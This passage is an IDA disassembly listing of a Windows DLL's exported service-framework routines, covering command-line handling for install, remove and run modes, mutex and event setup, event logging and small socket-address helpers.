		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4976B
		retn
; ---------------------------------------------------------------------------

loc_6AF49716:				; DATA XREF: .rdata:6AF63B98o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4976B
		retn
; ---------------------------------------------------------------------------

loc_6AF4976B:				; DATA XREF: Ordinal1056+A1o
					; Ordinal1056+F6o
		mov	esi, [ebp+var_28]

loc_6AF4976E:				; CODE XREF: Ordinal1056+5Fj
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF4977E
		xor	esi, esi
		jmp	short loc_6AF49790
; ---------------------------------------------------------------------------

loc_6AF4977E:				; CODE XREF: Ordinal1056+109j
		mov	eax, [esi+48h]
		push	dword ptr [eax+38h] ; int
		mov	ecx, esi
		push	[ebp+arg_0]	; Src
		call	Ordinal854
		mov	esi, eax

loc_6AF49790:				; CODE XREF: Ordinal1056+10Dj
		lea	ecx, [ebp+var_48]
		call	Ordinal752
		mov	ecx, [ebp+arg_0]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal1056	endp ; sp-analysis failed

; Exported entry 1074.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1074(char *lpSourceName,	int, int, int)
		public Ordinal1074
Ordinal1074	proc near		; CODE XREF: Ordinal466+18p
					; DATA XREF: .rdata:off_6AF66098o

var_E0		= byte ptr -0E0h
var_A4		= dword	ptr -0A4h
var_A0		= byte ptr -0A0h
var_74		= dword	ptr -74h
var_70		= dword	ptr -70h
Args		= byte ptr -6Ch
var_50		= dword	ptr -50h
var_4C		= byte ptr -4Ch
lpString2	= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= byte ptr -24h
var_20		= dword	ptr -20h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
lpSourceName	= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		mov	eax, offset unknown_libname_103	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 0D4h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		lea	ecx, [ebp+var_20]
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_50], esi
		call	Ordinal1060
		xor	edi, edi
		push	offset aImm32_dll ; "IMM32.DLL"
		lea	ecx, [ebp+var_20]
		mov	[ebp+var_4], edi
		call	Ordinal1062
		test	eax, eax
		jz	short loc_6AF49821
		cmp	[ebp+var_18], edi
		jz	short loc_6AF49821
		push	0FFFFFFFFh
		call	[ebp+var_18]
		test	eax, eax
		jnz	short loc_6AF4982C
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCserviceappRun ; "CServiceApp::Run() : ImmDisableIME() =="...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF4982B
; ---------------------------------------------------------------------------

loc_6AF49821:				; CODE XREF: Ordinal1074+3Fj
					; Ordinal1074+44j
		push	offset aCserviceappR_0 ; "CServiceApp::Run() : imm32.Load() == FA"...
		call	sub_6AF31006

loc_6AF4982B:				; CODE XREF: Ordinal1074+61j
		pop	ecx

loc_6AF4982C:				; CODE XREF: Ordinal1074+4Dj
		lea	ecx, [ebp+var_20]
		mov	[ebp+var_20], offset off_6AF5DEA0
		call	Ordinal891
		or	[ebp+var_28], 0FFFFFFFFh
		push	offset aCservicewind_4 ; "CServiceWindow::Run()"
		lea	ecx, [ebp+var_4C]
		mov	[ebp+var_74], edi
		call	Ordinal751
		push	[ebp+lpSourceName] ; Src
		xor	ebx, ebx
		inc	ebx
		mov	[ebp+var_4], ebx
		lea	ecx, [esi+38h]
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31B1D
		jmp	loc_6AF49907
; ---------------------------------------------------------------------------

loc_6AF49869:				; DATA XREF: .rdata:6AF63C38o
		push	13h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	ecx, [ebp+lpString2]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF49901
		retn
; ---------------------------------------------------------------------------

loc_6AF498AC:				; DATA XREF: .rdata:6AF63C48o
		push	15h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	eax, [ebp+var_70]
		push	dword ptr [eax]
		lea	eax, [ebp+var_24]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+var_24]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF49901
		retn
; ---------------------------------------------------------------------------

loc_6AF49901:				; DATA XREF: Ordinal1074+E8o
					; Ordinal1074+13Do
		mov	esi, [ebp+var_50]
		xor	ebx, ebx
		inc	ebx

loc_6AF49907:				; CODE XREF: Ordinal1074+A6j
		lea	ecx, [ebp+var_4C]
		mov	[ebp+var_4], ebx
		call	Ordinal753
		test	eax, eax
		jnz	loc_6AF49E50
		mov	eax, [esi+3A0h]
		cmp	eax, 3
		jz	short loc_6AF49945
		push	eax
		call	Ordinal446
		test	eax, eax
		pop	ecx
		jge	short loc_6AF49942
		push	eax		; Args
		push	offset aCserviceappR_1 ; "CServiceApp::Run() : CCoInitialize::CoI"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	loc_6AF49E50
; ---------------------------------------------------------------------------

loc_6AF49942:				; CODE XREF: Ordinal1074+170j
		mov	[ebp+var_74], ebx

loc_6AF49945:				; CODE XREF: Ordinal1074+165j
		lea	ecx, [ebp+var_A0]
		call	Ordinal914
		lea	ecx, [ebp+var_A0]
		mov	byte ptr [ebp+var_4], 4
		call	Ordinal918
		test	eax, eax
		jnz	short loc_6AF49973
		push	offset aCserviceappR_2 ; "CServiceApp::Run() : nullDacl.Create() "...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF49E45
; ---------------------------------------------------------------------------

loc_6AF49973:				; CODE XREF: Ordinal1074+1A3j
		lea	ecx, [ebp+var_E0]
		call	Ordinal302
		lea	ecx, [ebp+var_E0]
		mov	byte ptr [ebp+var_4], 5
		call	Ordinal306
		test	eax, eax
		jnz	short loc_6AF499A1
		push	offset aCserviceappR_3 ; "CServiceApp::Run() : adminDacl.Create()"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF49E3A
; ---------------------------------------------------------------------------

loc_6AF499A1:				; CODE XREF: Ordinal1074+1D1j
		lea	ecx, [ebp+lpString2]
		call	sub_6AF318C3
		lea	ecx, [ebp+var_4C]
		call	Ordinal754
		push	[ebp+lpSourceName] ; Src
		lea	ecx, [ebp+lpString2]
		mov	byte ptr [ebp+var_4], 7
		call	sub_6AF31B1D
		push	offset a_terminate_loc ; "_Terminate_Lock"
		lea	ecx, [ebp+lpString2]
		call	sub_6AF3B24F
		jmp	loc_6AF49A73
; ---------------------------------------------------------------------------

loc_6AF499D2:				; DATA XREF: .rdata:6AF63C58o
		push	13h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	ecx, [ebp+var_70]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF49A6D
		retn
; ---------------------------------------------------------------------------

loc_6AF49A15:				; DATA XREF: .rdata:6AF63C68o
		push	15h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	eax, [ebp+var_A4]
		push	dword ptr [eax]
		lea	eax, [ebp+var_24]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+var_24]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF49A6D
		retn
; ---------------------------------------------------------------------------

loc_6AF49A6D:				; DATA XREF: Ordinal1074+251o
					; Ordinal1074+2A9o
		mov	esi, [ebp+var_50]
		xor	ebx, ebx
		inc	ebx

loc_6AF49A73:				; CODE XREF: Ordinal1074+20Fj
		lea	ecx, [ebp+var_4C]
		mov	[ebp+var_4], 6
		call	Ordinal753
		test	eax, eax
		jnz	loc_6AF49C5F
		mov	edi, [ebp+lpString2]
		push	ebx		; int
		push	edi		; lpString2
		push	eax		; bInitialState
		push	ebx		; bManualReset
		lea	ecx, [ebp+var_E0]
		call	Ordinal766
		push	eax		; lpEventAttributes
		lea	ecx, [esi+174h]
		call	Ordinal1317
		test	eax, eax
		jnz	short loc_6AF49AB8
		push	offset aCserviceappR_4 ; "CServiceApp::Run() : m_TerminateEvent.C"...
		call	sub_6AF3102E
		jmp	short loc_6AF49ACD
; ---------------------------------------------------------------------------

loc_6AF49AB8:				; CODE XREF: Ordinal1074+2ECj
		mov	ecx, esi
		call	Ordinal1083
		test	eax, eax
		jz	short loc_6AF49AD3
		push	offset aCserviceappR_5 ; "CServiceApp::Run() : IsTerminating() !="...
		call	sub_6AF31006

loc_6AF49ACD:				; CODE XREF: Ordinal1074+2F8j
		pop	ecx
		jmp	loc_6AF49E32
; ---------------------------------------------------------------------------

loc_6AF49AD3:				; CODE XREF: Ordinal1074+303j
		lea	ecx, [ebp+Args]
		call	Ordinal448
		push	0		; Src
		push	0		; int
		lea	ecx, [ebp+Args]
		mov	byte ptr [ebp+var_4], 9
		call	Ordinal451
		test	eax, eax
		jnz	short loc_6AF49AF9
		push	offset aCserviceappR_6 ; "CServiceApp::Run() : commandLine.Parse("...
		jmp	loc_6AF49D0B
; ---------------------------------------------------------------------------

loc_6AF49AF9:				; CODE XREF: Ordinal1074+32Fj
		push	ebx
		push	2
		push	offset off_6AF5DC48
		lea	ecx, [ebp+Args]
		call	Ordinal453
		test	eax, eax
		jz	short loc_6AF49B24
		push	offset aCserviceappR_7 ; "CServiceApp::Run() : OnShowVersion()\n"
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+5Ch]
		jmp	loc_6AF49E27
; ---------------------------------------------------------------------------

loc_6AF49B24:				; CODE XREF: Ordinal1074+34Dj
		push	ebx
		push	3
		push	offset off_6AF5DC50
		lea	ecx, [ebp+Args]
		call	Ordinal453
		test	eax, eax
		jz	short loc_6AF49B4F
		push	offset aCserviceappR_8 ; "CServiceApp::Run() : OnShowHelp()\n"
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+58h]
		jmp	loc_6AF49E27
; ---------------------------------------------------------------------------

loc_6AF49B4F:				; CODE XREF: Ordinal1074+378j
		push	ebx
		push	2
		push	offset off_6AF5DC5C
		lea	ecx, [ebp+Args]
		call	Ordinal453
		test	eax, eax
		jz	short loc_6AF49B7A
		push	offset aCserviceappR_9 ; "CServiceApp::Run() : OnTerminate()\n"
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+54h]
		jmp	loc_6AF49E27
; ---------------------------------------------------------------------------

loc_6AF49B7A:				; CODE XREF: Ordinal1074+3A3j
		lea	ecx, [ebp+var_4C]
		call	Ordinal754
		push	[ebp+lpSourceName] ; Src
		lea	ecx, [ebp+lpString2]
		mov	byte ptr [ebp+var_4], 0Ah
		call	sub_6AF31B1D
		push	offset a_single_instan ; "_Single_Instance_Lock"
		lea	ecx, [ebp+lpString2]
		call	sub_6AF3B24F
		jmp	loc_6AF49C44
; ---------------------------------------------------------------------------

loc_6AF49BA3:				; DATA XREF: .rdata:6AF63C78o
		push	13h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	ecx, [ebp+var_A4]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF49C3E
		retn
; ---------------------------------------------------------------------------

loc_6AF49BE9:				; DATA XREF: .rdata:6AF63C88o
		push	15h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	eax, [ebp+var_70]
		push	dword ptr [eax]
		lea	eax, [ebp+var_24]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+var_24]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF49C3E
		retn
; ---------------------------------------------------------------------------

loc_6AF49C3E:				; DATA XREF: Ordinal1074+425o
					; Ordinal1074+47Ao
		mov	esi, [ebp+var_50]
		xor	ebx, ebx
		inc	ebx

loc_6AF49C44:				; CODE XREF: Ordinal1074+3E0j
		lea	ecx, [ebp+var_4C]
		mov	[ebp+var_4], 9
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF49C6A
		lea	ecx, [ebp+Args]
		call	Ordinal450

loc_6AF49C5F:				; CODE XREF: Ordinal1074+2C6j
		mov	ecx, [ebp+lpString2]
		add	ecx, 0FFFFFFF0h
		jmp	loc_6AF49E35
; ---------------------------------------------------------------------------

loc_6AF49C6A:				; CODE XREF: Ordinal1074+497j
		mov	edi, [ebp+lpString2]
		push	ebx		; int
		push	edi		; lpString2
		push	0		; bInitialOwner
		lea	ecx, [ebp+var_A0]
		call	Ordinal766
		push	eax		; lpMutexAttributes
		lea	ecx, [esi+17Ch]
		call	Ordinal1306
		test	eax, eax
		jnz	short loc_6AF49C93
		push	offset aCserviceapp_10 ; "CServiceApp::Run() : m_InstanceMutex.Cr"...
		jmp	short loc_6AF49D0B
; ---------------------------------------------------------------------------

loc_6AF49C93:				; CODE XREF: Ordinal1074+4CCj
		lea	ecx, [esi+17Ch]
		mov	eax, [ecx]
		push	0
		push	0		; Args
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF49CBD
		push	offset aCserviceapp_11 ; "CServiceApp::Run() : OnSingleInstance()"...
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+50h]
		jmp	loc_6AF49E27
; ---------------------------------------------------------------------------

loc_6AF49CBD:				; CODE XREF: Ordinal1074+4E6j
		lea	ecx, [esi+3Ch]
		call	Ordinal942
		test	eax, eax
		jz	short loc_6AF49CF7
		push	[ebp+lpSourceName] ; lpSourceName
		lea	ecx, [esi+328h]
		call	Ordinal709
		test	eax, eax
		jnz	short loc_6AF49CF7
		push	1Fh		; Data
		push	eax		; lpData
		push	[ebp+lpSourceName] ; pszSubKey
		lea	ecx, [esi+328h]
		call	Ordinal707
		test	eax, eax
		jnz	short loc_6AF49CF7
		push	offset aCserviceapp_12 ; "CServiceApp::Run() : m_EventLog.Open() "...
		jmp	short loc_6AF49D0B
; ---------------------------------------------------------------------------

loc_6AF49CF7:				; CODE XREF: Ordinal1074+509j
					; Ordinal1074+51Bj ...
		mov	eax, [esi]
		lea	ecx, [ebp+Args]
		push	ecx		; Args
		mov	ecx, esi
		call	dword ptr [eax+4Ch]
		test	eax, eax
		jnz	short loc_6AF49D16
		push	offset aCserviceapp_13 ; "CServiceApp::Run() : ProcessCommandLine"...

loc_6AF49D0B:				; CODE XREF: Ordinal1074+336j
					; Ordinal1074+4D3j ...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF49E2A
; ---------------------------------------------------------------------------

loc_6AF49D16:				; CODE XREF: Ordinal1074+546j
		push	ebx
		push	2
		push	offset off_6AF5DC38
		lea	ecx, [ebp+Args]
		call	Ordinal453
		test	eax, eax
		jz	short loc_6AF49D47
		push	offset aCserviceapp_14 ; "CServiceApp::Run() : OnInstallService()"...
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		push	[ebp+arg_8]
		mov	ecx, esi
		push	[ebp+arg_4]
		call	dword ptr [eax+6Ch]
		jmp	loc_6AF49E27
; ---------------------------------------------------------------------------

loc_6AF49D47:				; CODE XREF: Ordinal1074+56Aj
		push	ebx
		push	2
		push	offset off_6AF5DC40
		lea	ecx, [ebp+Args]
		call	Ordinal453
		test	eax, eax
		jz	short loc_6AF49D72
		push	offset aCserviceapp_15 ; "CServiceApp::Run() : OnRemoveService()\n"...
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+70h]
		jmp	loc_6AF49E27
; ---------------------------------------------------------------------------

loc_6AF49D72:				; CODE XREF: Ordinal1074+59Bj
		push	ebx
		push	ebx
		push	offset off_6AF5DC68
		lea	ecx, [ebp+Args]
		call	Ordinal453
		test	eax, eax
		jz	short loc_6AF49D9C
		push	offset aCserviceapp_16 ; "CServiceApp::Run() : OnRegServer()\n"
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+64h]
		jmp	loc_6AF49E27
; ---------------------------------------------------------------------------

loc_6AF49D9C:				; CODE XREF: Ordinal1074+5C5j
		push	ebx
		push	ebx
		push	offset off_6AF5DC6C
		lea	ecx, [ebp+Args]
		call	Ordinal453
		test	eax, eax
		jz	short loc_6AF49DC3
		push	offset aCserviceapp_17 ; "CServiceApp::Run() : OnUnregServer()\n"
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+68h]
		jmp	short loc_6AF49E27
; ---------------------------------------------------------------------------

loc_6AF49DC3:				; CODE XREF: Ordinal1074+5EFj
		push	ebx
		push	2
		push	offset off_6AF5DC30
		lea	ecx, [ebp+Args]
		call	Ordinal453
		test	eax, eax
		jz	short loc_6AF49DEB
		push	offset aCserviceapp_18 ; "CServiceApp::Run() : OnRunDebug()\n"
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+74h]
		jmp	short loc_6AF49E27
; ---------------------------------------------------------------------------

loc_6AF49DEB:				; CODE XREF: Ordinal1074+617j
		push	ebx
		push	ebx
		push	offset off_6AF5DC64
		lea	ecx, [ebp+Args]
		call	Ordinal453
		test	eax, eax
		jz	short loc_6AF49E12
		push	offset aCserviceapp_19 ; "CServiceApp::Run() : OnRunEmbedded()\n"
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+60h]
		jmp	short loc_6AF49E27
; ---------------------------------------------------------------------------

loc_6AF49E12:				; CODE XREF: Ordinal1074+63Ej
		push	offset aCserviceapp_20 ; "CServiceApp::Run() : OnRunService()\n"
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		push	[ebp+arg_C]
		mov	ecx, esi
		call	dword ptr [eax+78h]

loc_6AF49E27:				; CODE XREF: Ordinal1074+361j
					; Ordinal1074+38Cj ...
		mov	[ebp+var_28], eax

loc_6AF49E2A:				; CODE XREF: Ordinal1074+553j
		lea	ecx, [ebp+Args]
		call	Ordinal450

loc_6AF49E32:				; CODE XREF: Ordinal1074+310j
		lea	ecx, [edi-10h]

loc_6AF49E35:				; CODE XREF: Ordinal1074+4A7j
		call	sub_6AF3160D

loc_6AF49E3A:				; CODE XREF: Ordinal1074+1DEj
		lea	ecx, [ebp+var_E0]
		call	Ordinal303

loc_6AF49E45:				; CODE XREF: Ordinal1074+1B0j
		lea	ecx, [ebp+var_A0]
		call	Ordinal915

loc_6AF49E50:				; CODE XREF: Ordinal1074+156j
					; Ordinal1074+17Fj
		lea	ecx, [ebp+var_4C]
		call	Ordinal752
		lea	ecx, [esi+3Ch]
		call	Ordinal942
		test	eax, eax
		jz	short loc_6AF49E6F
		lea	ecx, [esi+328h]
		call	Ordinal710

loc_6AF49E6F:				; CODE XREF: Ordinal1074+6A4j
		cmp	[ebp+var_74], 0
		jz	short loc_6AF49E7A
		call	Ordinal447

loc_6AF49E7A:				; CODE XREF: Ordinal1074+6B5j
		mov	ecx, [ebp+var_C]
		mov	eax, [ebp+var_28]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	10h
Ordinal1074	endp ; sp-analysis failed

; Exported entry 1101.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1101
Ordinal1101	proc near		; CODE XREF: Ordinal467+1Fj
					; Ordinal1095+63p
					; DATA XREF: ...

var_5C		= byte ptr -5Ch
var_10		= byte ptr -10h
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 5Ch
		or	[ebp+var_4], 0FFFFFFFFh
		push	ebx
		push	esi
		mov	esi, ecx
		lea	ecx, [ebp+var_10]
		mov	dword ptr [esi+170h], 1
		call	Ordinal1066
		lea	ecx, [ebp+var_5C]
		call	Ordinal1054
		lea	ecx, [esi+3Ch]
		call	Ordinal942
		test	eax, eax
		mov	ebx, ds:GetCurrentProcessId
		jnz	short loc_6AF49F01
		push	offset aKernel32_dll_0 ; "KERNEL32.DLL"
		lea	ecx, [ebp+var_10]
		call	Ordinal1068
		test	eax, eax
		jz	short loc_6AF49EFA
		cmp	[ebp+var_8], 0
		jz	short loc_6AF49EFA
		push	1
		call	ebx ; GetCurrentProcessId
		push	eax
		call	[ebp+var_8]
		test	eax, eax
		jnz	short loc_6AF49F01
		push	offset aCserviceapp_21 ; "CServiceApp::RunHiddenWindow() : kernel"...
		jmp	short loc_6AF49F1E
; ---------------------------------------------------------------------------

loc_6AF49EFA:				; CODE XREF: Ordinal1101+49j
					; Ordinal1101+4Fj
		push	offset aCserviceapp_22 ; "CServiceApp::RunHiddenWindow() : kernel"...
		jmp	short loc_6AF49F1E
; ---------------------------------------------------------------------------

loc_6AF49F01:				; CODE XREF: Ordinal1101+38j
					; Ordinal1101+5Bj
		push	offset aCserviceapp_23 ; "CServiceApp::RunHiddenWindow() : servic"...
		call	sub_6AF31006
		pop	ecx
		push	esi
		lea	ecx, [ebp+var_5C]
		call	Ordinal1056
		test	eax, eax
		jnz	short loc_6AF49F26
		push	offset aCserviceapp_24 ; "CServiceApp::RunHiddenWindow() : servic"...

loc_6AF49F1E:				; CODE XREF: Ordinal1101+62j
					; Ordinal1101+69j
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF49F45
; ---------------------------------------------------------------------------

loc_6AF49F26:				; CODE XREF: Ordinal1101+81j
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+4]
		push	offset aCserviceapp_25 ; "CServiceApp::RunHiddenWindow() : servic"...
		mov	[ebp+var_4], eax
		call	sub_6AF31006
		pop	ecx
		push	0FFFFFFFFh	; dwMilliseconds
		lea	ecx, [ebp+var_5C]
		call	Ordinal1388

loc_6AF49F45:				; CODE XREF: Ordinal1101+8Ej
		cmp	[ebp+var_8], 0
		jz	short loc_6AF49F53
		push	0
		call	ebx ; GetCurrentProcessId
		push	eax
		call	[ebp+var_8]

loc_6AF49F53:				; CODE XREF: Ordinal1101+B3j
		lea	ecx, [ebp+var_5C]
		call	Ordinal1055
		lea	ecx, [ebp+var_10]
		call	Ordinal1067
		mov	eax, [ebp+var_4]
		pop	esi
		pop	ebx
		leave
		retn
Ordinal1101	endp

; Exported entry 1095.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1095
Ordinal1095	proc near		; CODE XREF: Ordinal472+40p
					; DATA XREF: .rdata:6AF5DF38o ...

arg_0		= dword	ptr  4

		push	esi
		push	8007h		; uMode
		mov	esi, ecx
		call	ds:SetErrorMode
		lea	ecx, [esi+3Ch]
		mov	dword ptr [esi+16Ch], 1
		call	Ordinal942
		test	eax, eax
		jz	short loc_6AF49FC0
		push	offset aCserviceappO_5 ; "CServiceApp::OnRunService() :	Register("...
		call	sub_6AF31006
		mov	eax, [esi+38h]
		pop	ecx
		push	[esp+4+arg_0]	; int
		mov	ecx, esi
		push	eax		; Src
		call	Ordinal1030
		test	eax, eax
		jnz	short loc_6AF49FBC
		push	offset aCserviceappO_6 ; "CServiceApp::OnRunService() :	Register("...
		call	sub_6AF3102E
		pop	ecx
		or	eax, 0FFFFFFFFh
		jmp	short loc_6AF49FD2
; ---------------------------------------------------------------------------

loc_6AF49FBC:				; CODE XREF: Ordinal1095+40j
		xor	eax, eax
		jmp	short loc_6AF49FD2
; ---------------------------------------------------------------------------

loc_6AF49FC0:				; CODE XREF: Ordinal1095+22j
		push	offset aCserviceappO_7 ; "CServiceApp::OnRunService() :	RunHidden"...
		call	sub_6AF31006
		pop	ecx
		mov	ecx, esi
		call	Ordinal1101

loc_6AF49FD2:				; CODE XREF: Ordinal1095+50j
					; Ordinal1095+54j
		pop	esi
		retn	4
Ordinal1095	endp

; Exported entry 1102.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1102
Ordinal1102	proc near		; CODE XREF: Ordinal1126+14p
					; Ordinal1128+27p ...
		push	esi
		mov	esi, ecx
		and	word ptr [esi+2], 0
		push	0		; hostlong
		mov	word ptr [esi],	2
		call	ds:htonl
		push	8		; Size
		mov	[esi+4], eax
		lea	eax, [esi+8]
		push	0		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn
Ordinal1102	endp

; Exported entry 1103.
; Exported entry 1104.
; Exported entry 1106.
; Exported entry 1107.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1103
Ordinal1103	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx	; ccL30_1103
					; ccL30_1104
					; ccL30_1106
		retn	4
Ordinal1103	endp

; Exported entry 1111.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1111
Ordinal1111	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		mov	ax, [ecx+2]
		push	eax		; netshort
		call	ds:ntohs
		movzx	eax, ax
		retn
Ordinal1111	endp

; Exported entry 1112.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1112(u_short hostshort)
		public Ordinal1112
Ordinal1112	proc near		; CODE XREF: Ordinal1126+50p
					; Ordinal1128+41p ...

hostshort	= word ptr  4

		push	esi
		push	dword ptr [esp+4+hostshort] ; hostshort
		mov	esi, ecx
		call	ds:htons
		mov	[esi+2], ax
		xor	eax, eax
		inc	eax
		pop	esi
		retn	4
Ordinal1112	endp

; Exported entry 1113.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1113
Ordinal1113	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		or	dword ptr [eax+4], 0FFFFFFFFh
		and	dword ptr [eax+8], 0
		and	dword ptr [eax+0Ch], 0
		mov	dword ptr [eax], offset	off_6AF5E680
		retn
Ordinal1113	endp

; Exported entry 1119.

